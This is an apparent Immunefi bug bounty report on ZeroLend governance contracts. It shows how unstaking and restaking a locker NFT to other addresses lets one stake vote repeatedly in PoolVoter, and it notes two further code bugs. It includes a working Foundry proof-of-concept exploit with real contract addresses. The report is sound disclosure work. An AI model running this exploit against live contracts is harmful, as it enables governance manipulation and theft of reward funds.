# 28912 - \[SC - Critical] Attackers can control the vote result and ampli...

Submitted on Mar 1st 2024 at 17:54:55 UTC by @offside0011 for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #28912

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/zerolend/governance>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

There is on lock on `PoolVoter.sol`. The voting results can be manipulated by repeatedly staking and unstaking in OmnichainStaking.

## Vulnerability Details

Users can obtain NFTs by locking their zero tokens in either `lockerLp` or `lockerToken`. After acquiring the NFT, they can stake it in the `OmnichainStaking` to earn the corresponding token. Subsequently, they gain the ability to vote through PoolVoter, allowing them to control the share of the respective pool. When users vote, the PoolVoter.sol directly uses their balance in OmnichainStaking to determine their voting weight.

```
    function _vote(
        address _who,
        address[] memory _poolVote,
        uint256[] memory _weights
    ) internal {
        // require(ve(_ve).isApprovedOrOwner(msg.sender, _tokenId));
        _reset(_who);
        uint256 _poolCnt = _poolVote.length;
        uint256 _weight = staking.balanceOf(_who);
        uint256 _totalVoteWeight = 0;
        uint256 _usedWeight = 0;
```

Although there are some checks in OmnichainStaking to avoid transfer between users

```
    function transfer(address, uint256) public pure override returns (bool) {
        // don't allow users to transfer voting power. voting power can only
        // be minted or burnt and act like SBTs
        require(false, "transfer disabled");
        return false;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) public pure override returns (bool) {
        // don't allow users to transfer voting power. voting power can only
        // be minted or burnt and act like SBTs
        require(false, "transferFrom disabled");
        return false;
    }
```

This check can be bypassed by unstaking directly and then staking it for another user.

```
        if (data.length > 0) from = abi.decode(data, (address));

        // if the stake is from the LP locker, then give 4 times the voting power
        if (msg.sender == address(lpLocker)) {
            lpPower[tokenId] = lpLocker.balanceOfNFT(tokenId);
            _mint(from, lpPower[tokenId] * 4);
        }
        // if the stake is from a regular token locker, then give 1 times the voting power
        else if (msg.sender == address(tokenLocker)) {
            tokenPower[tokenId] = tokenLocker.balanceOfNFT(tokenId);
            _mint(from, tokenPower[tokenId]);
        } else require(false, "invalid operator");
```

## Impact Details

The voting results can be manipulated and amplified, and the gauge pool rewards weight is based on the results of the voting. Therefore, attackers can exploit this to gain additional profits.

* TIP1: Through auditing the code, another issue in the profit distribution process may be discovered. By manipulating the voting ratio at that moment, attackers can gain more profits. However, this second vulnerability would be analyzed more after fixing the first one.
* TIP2: There is a bug in PoolVoter.sol, the bool check is wrong

```
    function registerGauge(
        address _asset,
        address _gauge
    ) external onlyOwner returns (address) {
        if (isPool[_asset]) {
            _pools.push(_asset);
            isPool[_asset] = true;
        }
```

* TIP3 Another bug in voters.ts, the `governance.vestedZeroNFT.target` and `lending.protocolDataProvider.target` is wrong.

```
  await factory.setAddresses(
    guageImpl.target,
    governance.zero.target,
    eligibilityCriteria.target,
    governance.lending.oracle.target,
    // lending.protocolDataProvider.target,
    governance.vestedZeroNFT.target,
    lending.protocolDataProvider.target
  );
```

## References

<https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L98> <https://github.com/zerolend/governance/blob/main/contracts/locker/OmnichainStaking.sol#L60>

## Proof of concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./interface.sol";
/*
poolVoter 0x3818eAb6Ca8Bf427222bfACFA706c514145F4104
lockerToken 0x92b0d1Cc77b84973B7041CB9275d41F09840eaDd
omnichainStaking 0x9eb52339B52e71B1EFD5537947e75D23b3a7719B
zero 0x9f62EE65a8395824Ee0821eF2Dc4C947a23F0f25
vestedZeroNFT 0x20BBE62B175134D21b10C157498b663F048672bA
*/

IERC20 constant zero = IERC20(0x9f62EE65a8395824Ee0821eF2Dc4C947a23F0f25);
isakte constant stake = isakte(0x9eb52339B52e71B1EFD5537947e75D23b3a7719B);
PoolVoter constant poolVoter = PoolVoter(0x3818eAb6Ca8Bf427222bfACFA706c514145F4104);
iLockerToken constant lockerToken = iLockerToken(0x92b0d1Cc77b84973B7041CB9275d41F09840eaDd);

interface iLockerToken {
    function underlying() external returns (address);
    function createLock(
        uint256 _value,
        uint256 _lockDuration,
        bool _stakeNFT
    ) external returns (uint256);
    function safeTransferFrom(address,address,uint256,bytes memory) external;
}

interface isakte {
    function unstakeToken(uint256 tokenId) external;
}

interface PoolVoter {
    function pools() external returns (address[] memory);
    function owner() external returns (address);
    function length() external returns (uint256);
    function weights(address) external returns (uint256);
    function registerGauge(
        address _asset,
        address _gauge
    ) external;
    function vote(
        address[] calldata _poolVote,
        uint256[] calldata _weights
    ) external;
}


contract Main is Test {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545");


    }

    function testEXP() public {

        address owner = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
        deal(address(stake), address(owner), 1 ether);
        vm.startPrank(owner);
        poolVoter.registerGauge(address(1), address(11111));


        poolVoter.registerGauge(address(3), address(22222));

        address[] memory pools = new address[](3);
        uint256[] memory weights = new uint256[](3);
        pools[0] = address(1);
        pools[1] = address(3);
        weights[0] = 5;
        weights[1] = 5;
        poolVoter.vote(pools, weights);
        vm.stopPrank();
        address[] memory p= poolVoter.pools();
        console.log('Before:');
        
        for (uint i = 0; i < 3; i++) {
            console.log('Pool', i);
            console.log(poolVoter.weights(p[i]));            
        }

        deal(address(zero), address(this), 1 ether);
        zero.approve(address(lockerToken), 1 ether);
        uint256 nftid = lockerToken.createLock(1 ether, 365 * 86400, false);
        lockerToken.safeTransferFrom(address(this), address(stake), nftid, abi.encode(address(this)));

        address[] memory pools2 = new address[](3);
        uint256[] memory weights2 = new uint256[](3);
        pools2[0] = p[0];
        weights2[0] = 5;
        console.log('After attack vote:');
        poolVoter.vote(pools2, weights2);
        for (uint i = 0; i < 3; i++) {
            console.log('Pool', i);
            console.log(poolVoter.weights(p[i]));            
        }
        stake.unstakeToken(nftid);
        console.log('Transfer nft to hack2(0xdeadbeef)');
        lockerToken.safeTransferFrom(address(this), address(stake), nftid, abi.encode(address(0xdeadbeef)));

        vm.startPrank(address(0xdeadbeef));
        poolVoter.vote(pools2, weights2);
        for (uint i = 0; i < 3; i++) {
            console.log('Pool', i);
            console.log(poolVoter.weights(p[i]));            
        }
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector; 
    }
}
```
